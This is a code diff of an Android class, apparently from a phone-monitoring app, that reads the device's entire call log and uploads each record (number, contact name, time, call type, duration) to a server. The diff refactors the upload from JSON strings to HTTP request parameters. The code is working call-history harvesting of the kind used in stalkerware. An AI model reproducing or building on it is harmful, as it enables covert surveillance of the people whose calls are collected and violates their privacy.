@@ -1,19 +1,17 @@
 package com.inet.android.list;
 
-import org.json.JSONException;
-import org.json.JSONObject;
-
 import android.content.Context;
 import android.database.Cursor;
 import android.os.AsyncTask;
 import android.provider.CallLog;
 
 import com.inet.android.bs.NetworkChangeReceiver;
-import com.inet.android.request.ConstantValue;
+import com.inet.android.request.AppConstants;
 import com.inet.android.request.RequestList;
+import com.inet.android.utils.AppSettings;
 import com.inet.android.utils.ConvertDate;
 import com.inet.android.utils.Logging;
-import com.inet.android.utils.ValueWork;
+import com.loopj.android.http.RequestParams;
 
 /**
  * ListCall class is designed to get the list of call
@@ -21,9 +19,9 @@ import com.inet.android.utils.ValueWork;
  * @author johny homicide
  * 
  */
-public class ListCall extends AsyncTask<Context, Void, Void> {
+public class CallList extends AsyncTask<Context, Void, Void> {
 	private Context mContext;
-	private String LOG_TAG = ListCall.class.getSimpleName().toString();
+	private String LOG_TAG = CallList.class.getSimpleName().toString();
 	private String complete;
 	private int version;
 	
@@ -31,7 +29,7 @@ public class ListCall extends AsyncTask<Context, Void, Void> {
 		
 		String sendStr = null;
 		int type = -1;
-		version = ValueWork.getMethod(ConstantValue.TYPE_LIST_CALL, mContext);
+		version = AppSettings.getSetting(AppConstants.TYPE_LIST_CALL, mContext);
 		Logging.doLog(LOG_TAG, "readCall" + version, "readCall" + version);
 
 		if (NetworkChangeReceiver.isOnline(mContext)!= 0) {
@@ -46,8 +44,7 @@ public class ListCall extends AsyncTask<Context, Void, Void> {
 					null, android.provider.CallLog.Calls.DEFAULT_SORT_ORDER);
 
 			if (callLogCursor != null) {
-				JSONObject archiveCallJson = new JSONObject();
-
+				RequestParams params = new RequestParams();
 				// Проходим в цикле, пока не дойдём до последней записи
 
 				while (callLogCursor.moveToNext()) {
@@ -81,49 +78,45 @@ public class ListCall extends AsyncTask<Context, Void, Void> {
 					if (name == null)
 						name = "No Name";
 					if (callType == CallLog.Calls.OUTGOING_TYPE) {
-						type = ConstantValue.TYPE_OUTGOING_CALL_REQUEST;
+						type = AppConstants.TYPE_OUTGOING_CALL_REQUEST;
 					} else if (callType == CallLog.Calls.INCOMING_TYPE) {
-						type = ConstantValue.TYPE_INCOMING_CALL_REQUEST;
+						type = AppConstants.TYPE_INCOMING_CALL_REQUEST;
 					} else if (callType == CallLog.Calls.MISSED_TYPE) {
-						type = ConstantValue.TYPE_MISSED_CALL_REQUEST;
+						type = AppConstants.TYPE_MISSED_CALL_REQUEST;
 					}
-					try {
-						archiveCallJson.put("time", dateString);
-						archiveCallJson.put("number", number);
-						archiveCallJson.put("type", type);
-						archiveCallJson.put("name", name);
-						if (type == 3)
-							archiveCallJson.put("duration", duration);
-						if (sendStr == null)
-							sendStr = archiveCallJson.toString();
-						else
-							sendStr += "," + archiveCallJson.toString();
+					params.put("data[][info][time]", dateString);
+					params.put("data[][info][type]", Integer.toString(type));
+					params.put("data[][info][number]", number);
+					params.put("data[][info][name]", name);
+					if (type == 3)
+							params.put("data[][info][duration]", duration);
+//						if (sendStr == null)
+//							sendStr = archiveCallJson.toString();
+//						else
+//							sendStr += "," + archiveCallJson.toString();
 
-					} catch (JSONException e) {
-						// TODO Автоматически созданный блок catch
-						e.printStackTrace();
-					}
-					if (sendStr.length() >= 50000) {
-
-						Logging.doLog(LOG_TAG, "str >= 50000", "str >= 50000");
-						sendRequest(sendStr, complete);
-						sendStr = null;
-					}
+					
+//					if (sendStr.length() >= 50000) {
+//
+//						Logging.doLog(LOG_TAG, "str >= 50000", "str >= 50000");
+//						sendRequest(sendStr, complete);
+//						sendStr = null;
+//					}
 				}
-				if (sendStr != null) {
-					lastRaw(sendStr);
+//				if (sendStr != null) {
+					setLastRaw(params);
 					sendStr = null;
-				} else {
-					lastRaw("");
-					sendStr = null;
-				}
+//				} else {
+//					lastRaw("");
+//					sendStr = null;
+//				}
 				Logging.doLog(LOG_TAG, "callLogCursor.close()",
 						"callLogCursor.close()");
 				callLogCursor.close();
 			} else {
 				Logging.doLog(LOG_TAG, "callLogCursor == null",
 						"callLogCursor == null");
-				lastRaw("");
+//				setLastRaw("");
 				sendStr = null;
 			}
 		} else {
@@ -135,17 +128,17 @@ public class ListCall extends AsyncTask<Context, Void, Void> {
 
 	private void endList() {
 		Logging.doLog(LOG_TAG, "endList " , "endList "  + version);	
-		TurnSendList.setList(ConstantValue.TYPE_LIST_CALL, version, "0", mContext);
+		Queue.setList(AppConstants.TYPE_LIST_CALL, version, "0", mContext);
 	}
 
-	private void lastRaw(String sendStr) {
+	private void setLastRaw(RequestParams params) {
 		complete = "1";
 		Logging.doLog(LOG_TAG, "Send complete 1 .." + version, "Send complete 1 .." + version);
-		sendRequest(sendStr, complete);
+		RequestList.sendDemandRequest(params, AppConstants.TYPE_LIST_CALL_REQUEST, complete, version, mContext);
 	}
 
 	private void sendRequest(String str, String complete) {
-		RequestList.sendDemandRequest(str, ConstantValue.TYPE_LIST_CALL_REQUEST, complete, version, mContext);
+		RequestList.sendDemandRequest(str, AppConstants.TYPE_LIST_CALL_REQUEST, complete, version, mContext);
 	}
 
 	@Override
